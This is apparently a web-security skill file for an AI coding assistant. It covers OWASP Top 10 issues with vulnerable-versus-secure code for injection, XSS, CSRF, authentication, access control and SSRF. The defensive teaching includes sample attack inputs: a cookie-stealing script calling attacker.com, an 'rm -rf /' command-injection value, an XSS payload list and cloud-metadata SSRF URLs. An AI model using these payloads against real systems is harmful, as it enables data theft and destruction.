---
last_updated: 2026-02-25
status: active
name: web-security
description: OWASP Top 10, XSS, CSRF, injection attacks, security headers. Use when reviewing or implementing security.
triggers:
  files: ["**/auth/**", "**/security/**", "**/middleware/**", "**/login.*", "**/api/**"]
  keywords: ["XSS", "CSRF", "SQL injection", "OWASP", "security", "vulnerability", "CSP", "authentication", "authorization", "sanitize", "escape", "privilege", "session", "token", "encrypt", "hash", "password"]
license: Complete terms in LICENSE.txt
allowed-tools: Read, Write, Edit
---

# Web Security Deep Expertise

This skill provides comprehensive guidance on web application security, focusing on OWASP Top 10 vulnerabilities, common attack vectors, and secure coding practices. Apply this knowledge when reviewing code for security issues, implementing authentication/authorization systems, or hardening web applications against attacks.

## Overview: OWASP Top 10 (2021)

The OWASP Top 10 represents the most critical security risks to web applications:

1. **A01:2021 - Broken Access Control**
   - IDOR (Insecure Direct Object References)
   - Privilege escalation
   - Missing function-level access control

2. **A02:2021 - Cryptographic Failures**
   - Exposure of sensitive data
   - Weak encryption algorithms
   - Missing encryption

3. **A03:2021 - Injection**
   - SQL, NoSQL, LDAP, OS command injection
   - ORM injection
   - Server-Side Template Injection (SSTI)

4. **A04:2021 - Insecure Design**
   - Missing or ineffective control design
   - Lack of threat modeling
   - Insecure design patterns

5. **A05:2021 - Security Misconfiguration**
   - Default credentials
   - Verbose error messages
   - Unnecessary features enabled

6. **A06:2021 - Vulnerable and Outdated Components**
   - Unpatched dependencies
   - Known vulnerabilities in libraries

7. **A07:2021 - Identification and Authentication Failures**
   - Credential stuffing
   - Brute force attacks
   - Session fixation

8. **A08:2021 - Software and Data Integrity Failures**
   - Insecure deserialization
   - CI/CD pipeline attacks
   - Unsigned updates

9. **A09:2021 - Security Logging and Monitoring Failures**
   - Insufficient logging
   - Missing alerting
   - Delayed breach detection

10. **A10:2021 - Server-Side Request Forgery (SSRF)**
    - Internal service access
    - Cloud metadata exposure


## Define Done

- [ ] Threat vectors identified for the target system
- [ ] Vulnerabilities assessed with severity ratings
- [ ] Mitigation strategies provided with implementation guidance
- [ ] Security measures don't create unacceptable usability barriers

## Core Security Principles

### Defense in Depth
Layer multiple security controls so failure of one doesn't compromise the entire system.

```
Frontend Validation → Backend Validation → Database Constraints → Monitoring
```

### Least Privilege
Grant minimum permissions necessary for functionality.

```python
# BAD: Overly permissive
@app.get("/api/users")
async def get_users(current_user: User):
    return db.query(User).all()

# GOOD: Role-based restrictions
@app.get("/api/users")
async def get_users(current_user: User = Depends(require_admin)):
    return db.query(User).all()
```

### Fail Secure
When errors occur, default to denying access rather than granting it.

```python
# BAD: Fails open
def check_permission(user_id, resource_id):
    try:
        return has_access(user_id, resource_id)
    except Exception:
        return True  # Grants access on error!

# GOOD: Fails closed
def check_permission(user_id, resource_id):
    try:
        return has_access(user_id, resource_id)
    except Exception:
        logger.error(f"Permission check failed for {user_id}")
        return False  # Denies access on error
```

### Never Trust User Input
All input is malicious until proven otherwise. Validate, sanitize, and encode.

### Security Through Obscurity Is Not Security
Don't rely on attackers not knowing your implementation. Assume they have full source code access.

## 1. Injection Attacks

### SQL Injection

**Vulnerability**: Unsanitized user input executed as SQL code.

```python
# VULNERABLE: String concatenation
def get_user_by_email(email):
    query = f"SELECT * FROM users WHERE email = '{email}'"
    return db.execute(query)

# Attack: email = "' OR '1'='1"
# Result: SELECT * FROM users WHERE email = '' OR '1'='1'
# Returns ALL users!
```

**Defense**: Parameterized queries (prepared statements)

```python
# SECURE: Parameterized query
def get_user_by_email(email):
    query = "SELECT * FROM users WHERE email = ?"
    return db.execute(query, (email,))

# SQLAlchemy ORM (automatically parameterized)
def get_user_by_email(email):
    return db.query(User).filter(User.email == email).first()
```

**Advanced SQL Injection Scenarios**:

```python
# VULNERABLE: Dynamic table/column names
def get_data(table_name, column_name):
    query = f"SELECT {column_name} FROM {table_name}"
    return db.execute(query)

# SECURE: Whitelist approach
ALLOWED_TABLES = {'users', 'posts', 'comments'}
ALLOWED_COLUMNS = {'id', 'name', 'email', 'created_at'}

def get_data(table_name, column_name):
    if table_name not in ALLOWED_TABLES:
        raise ValueError("Invalid table")
    if column_name not in ALLOWED_COLUMNS:
        raise ValueError("Invalid column")

    # Still use parameterization for values
    query = f"SELECT {column_name} FROM {table_name} WHERE id = ?"
    return db.execute(query, (id,))
```

### NoSQL Injection

**Vulnerability**: NoSQL databases (MongoDB, CouchDB) also vulnerable to injection.

```javascript
// VULNERABLE: MongoDB injection
app.post('/login', async (req, res) => {
  const { username, password } = req.body;
  const user = await db.collection('users').findOne({
    username: username,
    password: password
  });
});

// Attack: POST with { "username": {"$ne": null}, "password": {"$ne": null} }
// Bypasses authentication!
```

**Defense**: Input validation and type checking

```javascript
// SECURE: Validate input types
app.post('/login', async (req, res) => {
  const { username, password } = req.body;

  // Ensure inputs are strings
  if (typeof username !== 'string' || typeof password !== 'string') {
    return res.status(400).json({ error: 'Invalid input' });
  }

  const user = await db.collection('users').findOne({
    username: username,
    password: await hashPassword(password)
  });
});
```

### Command Injection

**Vulnerability**: Executing system commands with user input.

```python
# VULNERABLE: Shell command with user input
import os

def resize_image(filename, width):
    os.system(f"convert {filename} -resize {width} output.jpg")

# Attack: filename = "image.jpg; rm -rf /"
# Executes: convert image.jpg; rm -rf / -resize 800 output.jpg
```

**Defense**: Avoid shell commands; use libraries instead

```python
# SECURE: Use library instead of shell
from PIL import Image

def resize_image(filename, width):
    # Validate filename
    if not filename.endswith(('.jpg', '.png', '.gif')):
        raise ValueError("Invalid file type")

    # Use library (no shell)
    with Image.open(filename) as img:
        img.resize((width, int(img.height * width / img.width)))
        img.save('output.jpg')
```

If shell commands are unavoidable:

```python
# LESS BAD: Use subprocess with list (no shell)
import subprocess
import shlex

def run_safe_command(user_input):
    # Whitelist allowed commands
    ALLOWED_COMMANDS = {'ls', 'cat', 'echo'}

    command = shlex.split(user_input)
    if command[0] not in ALLOWED_COMMANDS:
        raise ValueError("Command not allowed")

    # shell=False prevents command injection
    result = subprocess.run(command, shell=False, capture_output=True)
    return result.stdout
```

### LDAP Injection

```python
# VULNERABLE
def authenticate_ldap(username, password):
    filter = f"(&(uid={username})(password={password}))"
    return ldap.search(filter)

# Attack: username = "*)(uid=*))(|(uid=*"
# Result: (&(uid=*)(uid=*))(|(uid=*)(password=pass))
# Bypasses authentication

# SECURE: Escape special characters
import ldap.filter

def authenticate_ldap(username, password):
    safe_username = ldap.filter.escape_filter_chars(username)
    safe_password = ldap.filter.escape_filter_chars(password)
    filter = f"(&(uid={safe_username})(password={safe_password}))"
    return ldap.search(filter)
```

### Input Validation Strategy

**Multi-Layer Validation**:

```python
from pydantic import BaseModel, validator, constr
from typing import Optional

class UserInput(BaseModel):
    email: constr(regex=r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$')
    username: constr(min_length=3, max_length=20, regex=r'^[a-zA-Z0-9_]+$')
    age: Optional[int] = None

    @validator('age')
    def validate_age(cls, v):
        if v is not None and (v < 0 or v > 150):
            raise ValueError('Invalid age')
        return v

# Usage
@app.post("/register")
async def register(user_input: UserInput):
    # Pydantic validates automatically
    # Additional business logic validation
    if await username_exists(user_input.username):
        raise HTTPException(400, "Username taken")

    # Safe to use validated input
    return create_user(user_input)
```

## 2. Cross-Site Scripting (XSS)

XSS allows attackers to inject malicious scripts into pages viewed by other users.

### Types of XSS

**1. Stored XSS** - Malicious script saved to database

```html
<!-- User submits comment -->
<script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie)
</script>

<!-- Comment displayed to all users, executing script -->
```

**2. Reflected XSS** - Script in URL reflected in page

```html
<!-- Vulnerable search page -->
<h1>Search results for: {{ query }}</h1>

<!-- Attack URL: /search?query=<script>alert(document.cookie)</script> -->
```

**3. DOM-based XSS** - Client-side script manipulates DOM unsafely

```javascript
// VULNERABLE
const name = new URLSearchParams(window.location.search).get('name');
document.getElementById('welcome').innerHTML = 'Hello ' + name;

// Attack: ?name=<img src=x onerror=alert(document.cookie)>
```

### XSS Prevention

**1. Output Encoding** - Escape HTML special characters

```python
# Python (Jinja2 auto-escapes by default)
<p>{{ user_comment }}</p>  <!-- Automatically escaped -->

# JavaScript
function escapeHtml(text) {
    const map = {
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#039;'
    };
    return text.replace(/[&<>"']/g, m => map[m]);
}

// Usage
element.textContent = userInput;  // Safe
// NOT: element.innerHTML = userInput; // Dangerous
```

**2. Framework Protection** - Use frameworks that auto-escape

```jsx
// React automatically escapes
function Comment({ text }) {
  return <p>{text}</p>;  // Safe - React escapes
}

// Explicitly dangerous (use only for trusted content)
function TrustedHtml({ html }) {
  return <div dangerouslySetInnerHTML={{ __html: html }} />;
}
```

**3. Content Security Policy (CSP)** - Browser-level protection

```python
# FastAPI middleware
@app.middleware("http")
async def add_security_headers(request, call_next):
    response = await call_next(request)
    response.headers['Content-Security-Policy'] = (
        "default-src 'self'; "
        "script-src 'self' 'nonce-{random}'; "  # Use nonces for inline scripts
        "style-src 'self' 'unsafe-inline'; "
        "img-src 'self' https:; "
        "font-src 'self'; "
        "connect-src 'self'; "
        "frame-ancestors 'none'; "
        "base-uri 'self'; "
        "form-action 'self'"
    )
    return response
```

**4. Sanitization Libraries** - For rich text input

```javascript
// Use DOMPurify for rich text
import DOMPurify from 'dompurify';

function sanitizeUserHtml(html) {
  return DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
    ALLOWED_ATTR: ['href']
  });
}
```

**5. Context-Aware Encoding**

```javascript
// HTML context
element.textContent = userInput;

// URL context
const url = `/profile?id=${encodeURIComponent(userId)}`;

// JavaScript context (avoid if possible)
const script = `const name = ${JSON.stringify(userName)};`;

// CSS context (avoid user input in CSS)
// If unavoidable, strict whitelist validation
```

### XSS Testing Payloads

Test your application with these:

```
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<iframe src=javascript:alert('XSS')>
<body onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>
<select onfocus=alert('XSS') autofocus>
<textarea onfocus=alert('XSS') autofocus>
<marquee onstart=alert('XSS')>
<details open ontoggle=alert('XSS')>
javascript:alert('XSS')
data:text/html,<script>alert('XSS')</script>
```

## 3. Cross-Site Request Forgery (CSRF)

CSRF tricks authenticated users into executing unwanted actions.

### Attack Scenario

```html
<!-- Attacker's website -->
<img src="https://bank.com/transfer?to=attacker&amount=1000">

<!-- If user is logged into bank.com, transfer executes! -->
```

### CSRF Defense Strategies

**1. CSRF Tokens** - Synchronizer token pattern

```python
# FastAPI with CSRF protection
from fastapi_csrf_protect import CsrfProtect
from pydantic import BaseModel

class CsrfSettings(BaseModel):
    secret_key: str = "your-secret-key"

@CsrfProtect.load_config
def get_csrf_config():
    return CsrfSettings()

@app.post("/api/transfer")
async def transfer(
    amount: int,
    to: str,
    csrf_protect: CsrfProtect = Depends()
):
    await csrf_protect.validate_csrf(request)
    return execute_transfer(amount, to)
```

```javascript
// Frontend: Include CSRF token
const response = await fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-CSRF-Token': getCsrfToken()  // From cookie or meta tag
  },
  body: JSON.stringify({ amount: 100, to: 'recipient' })
});
```

**2. SameSite Cookies**

```python
# Set SameSite attribute on session cookies
from fastapi import Response

response.set_cookie(
    key="session",
    value=session_id,
    httponly=True,
    secure=True,
    samesite="strict"  # or "lax"
)

# SameSite=Strict: Cookie never sent on cross-site requests
# SameSite=Lax: Cookie sent on top-level navigations (GET)
# SameSite=None: Cookie always sent (requires Secure flag)
```

**3. Double Submit Cookie Pattern**

```python
# Server: Set CSRF token in cookie
import secrets

csrf_token = secrets.token_urlsafe(32)
response.set_cookie("csrf_token", csrf_token)

# Client: Read cookie and send in header
# Server: Verify cookie matches header
@app.post("/api/action")
async def action(request: Request):
    cookie_token = request.cookies.get("csrf_token")
    header_token = request.headers.get("X-CSRF-Token")

    if not cookie_token or cookie_token != header_token:
        raise HTTPException(403, "CSRF validation failed")

    return perform_action()
```

**4. Origin/Referer Validation**

```python
@app.post("/api/action")
async def action(request: Request):
    origin = request.headers.get("Origin")
    referer = request.headers.get("Referer")

    allowed_origins = ["https://example.com", "https://www.example.com"]

    if origin and origin not in allowed_origins:
        raise HTTPException(403, "Invalid origin")

    if referer and not any(referer.startswith(o) for o in allowed_origins):
        raise HTTPException(403, "Invalid referer")

    return perform_action()
```

**5. Custom Request Headers**

```javascript
// Custom header prevents simple form submission attacks
const response = await fetch('/api/action', {
  method: 'POST',
  headers: {
    'X-Requested-With': 'XMLHttpRequest'
  }
});

// Server validates header presence
if (!request.headers.get('X-Requested-With')):
    raise HTTPException(403, "Invalid request")
```

## 4. Authentication Vulnerabilities

### Broken Authentication

**Common Issues**:
- Weak password policies
- Credential stuffing
- Session fixation
- Missing brute force protection
- Insecure password recovery

### Secure Password Handling

```python
from passlib.context import CryptContext
import secrets

# Use strong hashing (bcrypt, argon2, scrypt)
pwd_context = CryptContext(schemes=["argon2"], deprecated="auto")

# NEVER store plaintext passwords
class User:
    def set_password(self, password: str):
        # Hash with salt (automatic with passlib)
        self.password_hash = pwd_context.hash(password)

    def verify_password(self, password: str) -> bool:
        return pwd_context.verify(password, self.password_hash)

# Strong password requirements
def validate_password(password: str) -> bool:
    if len(password) < 12:
        return False
    if not any(c.isupper() for c in password):
        return False
    if not any(c.islower() for c in password):
        return False
    if not any(c.isdigit() for c in password):
        return False
    if not any(c in "!@#$%^&*()_+-=[]{}|;:,.<>?" for c in password):
        return False
    return True
```

### Brute Force Protection

```python
from datetime import datetime, timedelta
from collections import defaultdict

# Rate limiting
class LoginRateLimiter:
    def __init__(self):
        self.attempts = defaultdict(list)
        self.blocked = {}

    def check_attempt(self, identifier: str) -> bool:
        # Check if blocked
        if identifier in self.blocked:
            if datetime.utcnow() < self.blocked[identifier]:
                return False
            else:
                del self.blocked[identifier]

        # Clean old attempts
        cutoff = datetime.utcnow() - timedelta(minutes=15)
        self.attempts[identifier] = [
            t for t in self.attempts[identifier] if t > cutoff
        ]

        # Check rate
        if len(self.attempts[identifier]) >= 5:
            # Block for 15 minutes
            self.blocked[identifier] = datetime.utcnow() + timedelta(minutes=15)
            return False

        self.attempts[identifier].append(datetime.utcnow())
        return True

rate_limiter = LoginRateLimiter()

@app.post("/login")
async def login(email: str, password: str):
    # Check rate limit by email and IP
    ip = request.client.host
    if not rate_limiter.check_attempt(email):
        raise HTTPException(429, "Too many login attempts")
    if not rate_limiter.check_attempt(ip):
        raise HTTPException(429, "Too many login attempts")

    user = await authenticate(email, password)
    if not user:
        # Don't reveal which field was wrong
        raise HTTPException(401, "Invalid credentials")

    return create_session(user)
```

### Session Management

```python
import secrets
from datetime import datetime, timedelta

class SessionManager:
    def create_session(self, user_id: str) -> str:
        # Cryptographically strong session ID
        session_id = secrets.token_urlsafe(32)

        # Store session
        self.sessions[session_id] = {
            'user_id': user_id,
            'created_at': datetime.utcnow(),
            'last_activity': datetime.utcnow(),
            'ip': request.client.host,
            'user_agent': request.headers.get('user-agent')
        }

        return session_id

    def validate_session(self, session_id: str) -> Optional[dict]:
        session = self.sessions.get(session_id)
        if not session:
            return None

        # Check timeout (30 minutes inactivity)
        if datetime.utcnow() - session['last_activity'] > timedelta(minutes=30):
            del self.sessions[session_id]
            return None

        # Check absolute timeout (12 hours)
        if datetime.utcnow() - session['created_at'] > timedelta(hours=12):
            del self.sessions[session_id]
            return None

        # Update last activity
        session['last_activity'] = datetime.utcnow()
        return session

    def invalidate_session(self, session_id: str):
        if session_id in self.sessions:
            del self.sessions[session_id]

# Set secure cookie
response.set_cookie(
    key="session_id",
    value=session_id,
    httponly=True,      # Prevent JavaScript access
    secure=True,        # HTTPS only
    samesite="strict",  # CSRF protection
    max_age=43200       # 12 hours
)
```

### Multi-Factor Authentication (MFA)

```python
import pyotp
import qrcode

class MFAManager:
    def setup_totp(self, user_id: str) -> tuple[str, str]:
        # Generate secret
        secret = pyotp.random_base32()

        # Store secret (encrypted!)
        user = db.query(User).filter(User.id == user_id).first()
        user.totp_secret = encrypt(secret)
        db.commit()

        # Generate QR code
        totp_uri = pyotp.totp.TOTP(secret).provisioning_uri(
            name=user.email,
            issuer_name="Your App"
        )

        return secret, totp_uri

    def verify_totp(self, user_id: str, token: str) -> bool:
        user = db.query(User).filter(User.id == user_id).first()
        if not user.totp_secret:
            return False

        secret = decrypt(user.totp_secret)
        totp = pyotp.TOTP(secret)

        # Verify with time window (±1 period)
        return totp.verify(token, valid_window=1)

@app.post("/login")
async def login(email: str, password: str, totp_token: Optional[str] = None):
    user = await authenticate(email, password)
    if not user:
        raise HTTPException(401, "Invalid credentials")

    # Check if MFA required
    if user.totp_secret:
        if not totp_token:
            return {"requires_mfa": True}

        if not mfa_manager.verify_totp(user.id, totp_token):
            raise HTTPException(401, "Invalid MFA token")

    return create_session(user)
```

## 5. Authorization and Access Control

### Broken Access Control

**IDOR (Insecure Direct Object Reference)** - Most common access control vulnerability

```python
# VULNERABLE: No authorization check
@app.get("/api/documents/{doc_id}")
async def get_document(doc_id: int):
    doc = db.query(Document).filter(Document.id == doc_id).first()
    return doc

# Attack: Iterate doc_id to access all documents

# SECURE: Verify ownership
@app.get("/api/documents/{doc_id}")
async def get_document(
    doc_id: int,
    current_user: User = Depends(get_current_user)
):
    doc = db.query(Document).filter(
        Document.id == doc_id,
        Document.owner_id == current_user.id
    ).first()

    if not doc:
        raise HTTPException(404, "Document not found")

    return doc
```

### Role-Based Access Control (RBAC)

```python
from enum import Enum
from functools import wraps

class Role(str, Enum):
    USER = "user"
    MODERATOR = "moderator"
    ADMIN = "admin"

class Permission(str, Enum):
    READ_POSTS = "read:posts"
    CREATE_POSTS = "create:posts"
    DELETE_POSTS = "delete:posts"
    MANAGE_USERS = "manage:users"

# Role to permissions mapping
ROLE_PERMISSIONS = {
    Role.USER: [Permission.READ_POSTS, Permission.CREATE_POSTS],
    Role.MODERATOR: [
        Permission.READ_POSTS,
        Permission.CREATE_POSTS,
        Permission.DELETE_POSTS
    ],
    Role.ADMIN: [
        Permission.READ_POSTS,
        Permission.CREATE_POSTS,
        Permission.DELETE_POSTS,
        Permission.MANAGE_USERS
    ]
}

def require_permission(permission: Permission):
    def decorator(func):
        @wraps(func)
        async def wrapper(*args, current_user: User = Depends(get_current_user), **kwargs):
            user_permissions = ROLE_PERMISSIONS.get(current_user.role, [])
            if permission not in user_permissions:
                raise HTTPException(403, "Insufficient permissions")
            return await func(*args, current_user=current_user, **kwargs)
        return wrapper
    return decorator

@app.delete("/api/posts/{post_id}")
@require_permission(Permission.DELETE_POSTS)
async def delete_post(post_id: int, current_user: User):
    post = db.query(Post).filter(Post.id == post_id).first()
    if not post:
        raise HTTPException(404, "Post not found")

    # Additional check: can only delete own posts unless admin
    if post.author_id != current_user.id and current_user.role != Role.ADMIN:
        raise HTTPException(403, "Cannot delete others' posts")

    db.delete(post)
    db.commit()
    return {"message": "Post deleted"}
```

### Attribute-Based Access Control (ABAC)

More flexible than RBAC for complex scenarios:

```python
from typing import Callable

class AccessPolicy:
    def __init__(self):
        self.rules: list[Callable] = []

    def add_rule(self, rule: Callable):
        self.rules.append(rule)

    def evaluate(self, user: User, resource: dict, action: str) -> bool:
        # All rules must pass
        return all(rule(user, resource, action) for rule in self.rules)

# Define policies
document_policy = AccessPolicy()

# Rule 1: Owner can do anything
document_policy.add_rule(
    lambda user, resource, action: resource['owner_id'] == user.id
)

# Rule 2: Admin can do anything
document_policy.add_rule(
    lambda user, resource, action: user.role == Role.ADMIN
)

# Rule 3: Department members can read
document_policy.add_rule(
    lambda user, resource, action: (
        action == 'read' and
        user.department == resource['department']
    )
)

@app.get("/api/documents/{doc_id}")
async def get_document(
    doc_id: int,
    current_user: User = Depends(get_current_user)
):
    doc = db.query(Document).filter(Document.id == doc_id).first()
    if not doc:
        raise HTTPException(404, "Document not found")

    resource = {
        'owner_id': doc.owner_id,
        'department': doc.department
    }

    if not document_policy.evaluate(current_user, resource, 'read'):
        raise HTTPException(403, "Access denied")

    return doc
```

### Privilege Escalation Prevention

```python
# VULNERABLE: User can change their own role
@app.put("/api/users/me")
async def update_profile(
    update: UserUpdate,
    current_user: User = Depends(get_current_user)
):
    for key, value in update.dict(exclude_unset=True).items():
        setattr(current_user, key, value)
    db.commit()
    return current_user

# Attack: {"role": "admin"}

# SECURE: Whitelist allowed fields
ALLOWED_USER_FIELDS = {'name', 'email', 'bio', 'avatar'}

@app.put("/api/users/me")
async def update_profile(
    update: UserUpdate,
    current_user: User = Depends(get_current_user)
):
    update_data = update.dict(exclude_unset=True)

    # Filter to allowed fields only
    for key, value in update_data.items():
        if key not in ALLOWED_USER_FIELDS:
            raise HTTPException(400, f"Cannot update field: {key}")
        setattr(current_user, key, value)

    db.commit()
    return current_user
```

## 6. Sensitive Data Protection

### Data Classification

```python
from enum import Enum

class DataClassification(str, Enum):
    PUBLIC = "public"           # No protection needed
    INTERNAL = "internal"       # Access control required
    CONFIDENTIAL = "confidential"  # Encryption required
    RESTRICTED = "restricted"   # Encryption + audit logging

class SensitiveField:
    """Mark fields requiring special handling"""
    def __init__(self, classification: DataClassification):
        self.classification = classification
```

### Encryption at Rest

```python
from cryptography.fernet import Fernet
import os

class EncryptionService:
    def __init__(self):
        # Load key from environment (never hardcode!)
        key = os.getenv('ENCRYPTION_KEY')
        if not key:
            raise ValueError("ENCRYPTION_KEY not set")
        self.cipher = Fernet(key.encode())

    def encrypt(self, plaintext: str) -> str:
        return self.cipher.encrypt(plaintext.encode()).decode()

    def decrypt(self, ciphertext: str) -> str:
        return self.cipher.decrypt(ciphertext.encode()).decode()

encryption = EncryptionService()

class User(Base):
    __tablename__ = "users"

    id = Column(Integer, primary_key=True)
    email = Column(String, unique=True)

    # Encrypted field
    _ssn = Column("ssn", String)

    @property
    def ssn(self) -> str:
        if self._ssn:
            return encryption.decrypt(self._ssn)
        return None

    @ssn.setter
    def ssn(self, value: str):
        if value:
            self._ssn = encryption.encrypt(value)
        else:
            self._ssn = None
```

### Encryption in Transit

```python
# Always use HTTPS in production
# Redirect HTTP to HTTPS
from starlette.middleware.httpsredirect import HTTPSRedirectMiddleware

if os.getenv("ENVIRONMENT") == "production":
    app.add_middleware(HTTPSRedirectMiddleware)

# HSTS header
@app.middleware("http")
async def add_hsts_header(request, call_next):
    response = await call_next(request)
    response.headers["Strict-Transport-Security"] = "max-age=31536000; includeSubDomains"
    return response
```

### PII Handling

```python
import re
from typing import Any

class PIISanitizer:
    """Remove or mask PII from logs and responses"""

    PATTERNS = {
        'ssn': re.compile(r'\b\d{3}-\d{2}-\d{4}\b'),
        'credit_card': re.compile(r'\b\d{4}[- ]?\d{4}[- ]?\d{4}[- ]?\d{4}\b'),
        'email': re.compile(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'),
    }

    def sanitize(self, text: str) -> str:
        for name, pattern in self.PATTERNS.items():
            text = pattern.sub(f'[REDACTED-{name.upper()}]', text)
        return text

    def sanitize_dict(self, data: dict) -> dict:
        """Recursively sanitize dictionary values"""
        result = {}
        for key, value in data.items():
            if isinstance(value, str):
                result[key] = self.sanitize(value)
            elif isinstance(value, dict):
                result[key] = self.sanitize_dict(value)
            elif isinstance(value, list):
                result[key] = [
                    self.sanitize_dict(item) if isinstance(item, dict)
                    else self.sanitize(item) if isinstance(item, str)
                    else item
                    for item in value
                ]
            else:
                result[key] = value
        return result

sanitizer = PIISanitizer()

# Use in logging
import logging

class PIIFilter(logging.Filter):
    def filter(self, record):
        record.msg = sanitizer.sanitize(str(record.msg))
        return True

logger = logging.getLogger(__name__)
logger.addFilter(PIIFilter())
```

### Data Masking

```python
def mask_email(email: str) -> str:
    """user@example.com -> u***@example.com"""
    if '@' not in email:
        return email
    local, domain = email.split('@', 1)
    if len(local) <= 1:
        return email
    return f"{local[0]}{'*' * (len(local) - 1)}@{domain}"

def mask_credit_card(card: str) -> str:
    """4111111111111111 -> ************1111"""
    card = card.replace(' ', '').replace('-', '')
    if len(card) < 4:
        return card
    return '*' * (len(card) - 4) + card[-4:]

def mask_ssn(ssn: str) -> str:
    """123-45-6789 -> ***-**-6789"""
    parts = ssn.split('-')
    if len(parts) != 3:
        return ssn
    return f"***-**-{parts[2]}"

# Usage in API responses
class UserResponse(BaseModel):
    id: int
    email: str
    ssn: Optional[str]

    @validator('email')
    def mask_email_field(cls, v):
        return mask_email(v)

    @validator('ssn')
    def mask_ssn_field(cls, v):
        return mask_ssn(v) if v else None
```

## 7. Security Headers

Implement security headers to provide browser-level protection:

```python
from fastapi import FastAPI
from starlette.middleware.base import BaseHTTPMiddleware

class SecurityHeadersMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request, call_next):
        response = await call_next(request)

        # Content Security Policy (prevents XSS)
        response.headers['Content-Security-Policy'] = (
            "default-src 'self'; "
            "script-src 'self' 'unsafe-inline' https://cdn.example.com; "
            "style-src 'self' 'unsafe-inline'; "
            "img-src 'self' data: https:; "
            "font-src 'self'; "
            "connect-src 'self' https://api.example.com; "
            "frame-ancestors 'none'; "
            "base-uri 'self'; "
            "form-action 'self'"
        )

        # Prevent clickjacking
        response.headers['X-Frame-Options'] = 'DENY'

        # Prevent MIME type sniffing
        response.headers['X-Content-Type-Options'] = 'nosniff'

        # Force HTTPS
        response.headers['Strict-Transport-Security'] = (
            'max-age=31536000; includeSubDomains; preload'
        )

        # Control referrer information
        response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'

        # Browser feature permissions
        response.headers['Permissions-Policy'] = (
            'geolocation=(), microphone=(), camera=()'
        )

        # Remove server header
        response.headers.pop('Server', None)

        return response

app.add_middleware(SecurityHeadersMiddleware)
```

### CSP Nonce Pattern

```python
import secrets
from contextvars import ContextVar

csp_nonce: ContextVar[str] = ContextVar('csp_nonce')

@app.middleware("http")
async def add_csp_nonce(request, call_next):
    # Generate nonce per request
    nonce = secrets.token_urlsafe(16)
    csp_nonce.set(nonce)

    response = await call_next(request)

    # Add CSP with nonce
    response.headers['Content-Security-Policy'] = (
        f"default-src 'self'; script-src 'self' 'nonce-{nonce}'"
    )

    return response

# Use in templates
def get_csp_nonce() -> str:
    return csp_nonce.get()

# Jinja2 template
# <script nonce="{{ csp_nonce }}">...</script>
```

## 8. Server-Side Request Forgery (SSRF)

SSRF tricks server into making requests to unintended locations.

### Attack Scenarios

```python
# VULNERABLE: Fetch user-provided URL
@app.get("/api/preview")
async def preview_url(url: str):
    response = requests.get(url)
    return {"content": response.text}

# Attacks:
# 1. Internal services: url=http://localhost:6379/
# 2. Cloud metadata: url=http://169.254.169.254/latest/meta-data/
# 3. File system: url=file:///etc/passwd
```

### SSRF Prevention

```python
import ipaddress
from urllib.parse import urlparse

class URLValidator:
    BLOCKED_CIDRS = [
        ipaddress.ip_network('127.0.0.0/8'),      # Loopback
        ipaddress.ip_network('10.0.0.0/8'),       # Private
        ipaddress.ip_network('172.16.0.0/12'),    # Private
        ipaddress.ip_network('192.168.0.0/16'),   # Private
        ipaddress.ip_network('169.254.0.0/16'),   # Link-local (AWS metadata)
        ipaddress.ip_network('::1/128'),          # IPv6 loopback
        ipaddress.ip_network('fc00::/7'),         # IPv6 private
    ]

    ALLOWED_SCHEMES = ['http', 'https']

    def validate_url(self, url: str) -> bool:
        try:
            parsed = urlparse(url)

            # Check scheme
            if parsed.scheme not in self.ALLOWED_SCHEMES:
                raise ValueError(f"Invalid scheme: {parsed.scheme}")

            # Resolve hostname to IP
            hostname = parsed.hostname
            if not hostname:
                raise ValueError("No hostname in URL")

            # Check for blocked IPs
            ip = ipaddress.ip_address(socket.gethostbyname(hostname))

            for cidr in self.BLOCKED_CIDRS:
                if ip in cidr:
                    raise ValueError(f"IP {ip} is in blocked range {cidr}")

            return True

        except Exception as e:
            logger.warning(f"URL validation failed: {url}, {e}")
            return False

validator = URLValidator()

@app.get("/api/preview")
async def preview_url(url: str):
    if not validator.validate_url(url):
        raise HTTPException(400, "Invalid URL")

    # Additional: Use timeout and size limits
    try:
        response = requests.get(
            url,
            timeout=5,
            allow_redirects=False,  # Prevent redirect to internal
            stream=True
        )

        # Limit response size
        content = response.iter_content(chunk_size=8192)
        chunks = []
        total_size = 0
        max_size = 1024 * 1024  # 1MB

        for chunk in content:
            total_size += len(chunk)
            if total_size > max_size:
                raise ValueError("Response too large")
            chunks.append(chunk)

        return {"content": b''.join(chunks).decode()}

    except requests.RequestException as e:
        raise HTTPException(500, "Failed to fetch URL")
```

## 9. Security Logging and Monitoring

### What to Log

```python
import logging
from datetime import datetime
from typing import Optional

class SecurityLogger:
    def __init__(self):
        self.logger = logging.getLogger('security')
        self.logger.setLevel(logging.INFO)

        # Separate handler for security events
        handler = logging.FileHandler('logs/security.log')
        handler.setFormatter(logging.Formatter(
            '%(asctime)s | %(levelname)s | %(message)s'
        ))
        self.logger.addHandler(handler)

    def log_login_attempt(
        self,
        email: str,
        ip: str,
        success: bool,
        reason: Optional[str] = None
    ):
        self.logger.info(
            f"LOGIN_ATTEMPT | email={email} | ip={ip} | "
            f"success={success} | reason={reason or 'N/A'}"
        )

    def log_failed_authorization(
        self,
        user_id: str,
        resource: str,
        action: str,
        ip: str
    ):
        self.logger.warning(
            f"AUTHZ_FAILURE | user={user_id} | resource={resource} | "
            f"action={action} | ip={ip}"
        )

    def log_sensitive_data_access(
        self,
        user_id: str,
        data_type: str,
        record_id: str
    ):
        self.logger.info(
            f"SENSITIVE_ACCESS | user={user_id} | type={data_type} | "
            f"record={record_id}"
        )

    def log_config_change(
        self,
        user_id: str,
        setting: str,
        old_value: Any,
        new_value: Any
    ):
